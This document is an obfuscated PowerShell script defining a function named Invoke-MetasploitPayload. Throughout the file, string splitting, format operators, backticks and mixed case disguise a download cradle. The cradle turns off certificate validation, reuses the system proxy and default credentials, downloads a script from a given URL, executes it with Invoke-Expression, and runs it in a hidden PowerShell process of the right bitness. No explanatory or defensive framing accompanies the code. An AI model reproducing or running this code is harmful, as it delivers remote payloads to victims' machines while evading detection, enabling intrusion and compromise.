 sET-item ("vARiaBLE"+":P"+"UB9i") ([TYpE]("{0}{1}" -F 'iNtP','tR')  )  ;  SEt-ITEM ("vA"+"R"+"iABLE:F2"+"3h"+"SM") (  [typE]("{3}{4}{8}{6}{1}{0}{5}{7}{2}"-F'S.Pr','oStic','s','S','y','Oc','.dIAGN','Es','sTeM')) ;  function i`Nvo`ke`-`MeTaSp`LoIt`paYLoAd 
{


[CmdletBinding()]
Param
(
    [Parameter( mANDAtorY = ${tr`Ue})]
    [ValidateNotNullOrEmpty()]
    [string]${U`Rl}
)

    .("{0}{3}{4}{2}{1}"-f'W','e','s','rite-V','erbo') ('[*]'+' '+'C'+'reat'+'ing '+'D'+'ownl'+'oad '+'Crad'+'le '+'scri'+'pt '+'us'+'ing '+"$url")
    ${DowN`L`oA`DCR`AdLE} ='[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$client = New-Object Net.WebClient;$client.Proxy=[Net.WebRequest]::GetSystemWebProxy();$client.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;Invoke-Expression $client.downloadstring('''+${U`RL}+''');'
    
    .("{2}{0}{1}" -f'rite-Ver','bose','W') ((("{4}{3}{12}{6}{0}{1}{10}{11}{9}{2}{5}{7}{8}" -f ' if w','eAvYre ','rom a ','g ','[*] Figurin','32bi','ut','t or',' 64bit process..',' f','sta','rting','o')) -cREplace 'AvY',[cHAR]39)
    if(  (  lS ("VArIABLe"+":p"+"Ub9I") ).VALue::"SI`ze" -eq 4)
    {
        .("{2}{1}{3}{0}"-f'Verbose','t','Wri','e-') ((("{3}{9}{6}{0}{4}{1}{12}{10}{7}{11}{13}{5}{2}{8}" -f 'l','}re 6','.','[','ike we{0','l','Looks ',', us','exe','*] ','it','ing regular powersh','4b','el')) -F [CHAr]39)
        ${po`we`RShE`LLEXE} = ("{2}{0}{1}" -f 'ell.e','xe','powersh')
    }
    else
    {
        &("{1}{2}{0}" -f'e','Write-V','erbos') ((("{11}{7}{3}{0}{12}{6}{8}{9}{2}{10}{5}{4}{14}{13}{1}"-f 'ik','xe','in','oks l','owe','wow64 p',' we','*] Lo','d9Ere 32bi','t, us','g sys','[','e','ell.e','rsh'))  -REpLACe ([cHAr]100+[cHAr]57+[cHAr]69),[cHAr]39)
        ${pOwErsh`e`llE`xE}=${EN`V:wind`IR}+((("{8}{3}{5}{10}{2}{6}{9}{4}{7}{1}{0}" -f'l.exe','el','WindowsPo','0','.0{0}powe','}s','w','rsh','{','erShell{0}v1','yswow64{0}'))-F[chAR]92)
    };
    
    .("{0}{1}{2}" -f'Write','-Verbos','e') ("{7}{2}{4}{1}{0}{6}{5}{3}"-f'ss','oce','ea','..','ting Pr','ct',' Obje','[*] Cr')
    ${PRoCessI`N`Fo} = .("{1}{0}{2}" -f 'bj','New-O','ect') ("{2}{1}{0}{4}{5}{6}{3}" -f 'em.Diagnostics.','st','Sy','fo','Proce','ssStart','In')
    ${PR`O`CeSSIn`Fo}."FileN`Ame"=${POwE`Rs`HE`lleXE}
    ${pr`o`CESSiNfo}."argu`MenTs"=('-nop'+' '+'-'+'c '+"$DownloadCradle")
    ${PR`Oc`Es`sinfo}."uSeshel`lex`EC`UTE" = ${F`Al`se}
    ${pR`O`CESsinfO}."red`I`R`eCtstandAR`dOutPuT" = ${Tr`Ue}
    ${pr`OcEsS`infO}."Cr`eAt`eN`OWINDOw" = ${T`RuE}
    ${p`ROc`EsSIn`FO}."W`Ind`OwSTYLE" = ("{2}{0}{1}" -f 'de','n','Hid')
    &("{2}{0}{1}" -f 'V','erbose','Write-') ("{5}{0}{8}{9}{6}{11}{4}{1}{3}{2}{10}{7}" -f 'king',' n','w ','e','oad cradle in a','[*] Kic','down','cess..',' of','f ','pro','l')
    ${pR`OCESs} =  $f23hsm::("{1}{0}"-f 't','Star').Invoke(${p`Roc`eSSI`NfO})
    &("{0}{2}{1}" -f 'Wri','erbose','te-V') ("{0}{2}{1}" -f '[*] ','e!','Don')
}